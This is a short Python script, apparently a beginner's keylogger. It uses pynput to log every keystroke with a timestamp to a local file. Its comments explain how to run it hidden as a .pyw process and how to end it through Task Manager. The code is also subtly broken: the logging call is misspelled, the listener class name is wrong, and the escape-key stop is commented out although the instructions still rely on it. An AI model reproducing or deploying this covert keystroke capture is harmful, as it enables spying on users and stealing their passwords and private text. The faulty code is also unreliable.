from pynput.keyboard import Key, Listener       # import the Listener class from pynput.keyboard    
import logging                                  # import the logging module, vanilla python

log_dir = ""                                  # set the log directory to an empty string

loggin.basicConfig(filename = (log_dir + "key_log.txt"), level = logging.DEBUG, format = "%(asctime)s: %(message)s")                             
      #            set out file/the file to log to, set the level to debug, and set the format to the time and the message
# set the log file to key_log.txt and set the level to DEBUG

def on_press(key):                             # define the on_press function
    logging.info(str(key))                          # log the key that was pressed
    #if key == Key.esc:                             # if the key that was pressed is the escape key
    #    return False                                # return false to stop the listener

with listener(on_press = on_press) as listener:    # create a listener and set the on_press function to the on_press function
    listener.join()                                # join the listener to the main thread

# to run, type on your terminal "python .\logger.pyw"
# to stop, type on your terminal "esc"
# to see the log, type on your terminal "type .\key_log.txt"
# to see the log in real time, type on your terminal "tail -f .\key_log.txt"

#to run behind the scenes, just open the pyw file, the screen will refresh and it will be working
#to stop, go to task manager and kill the python/ python(32bit) process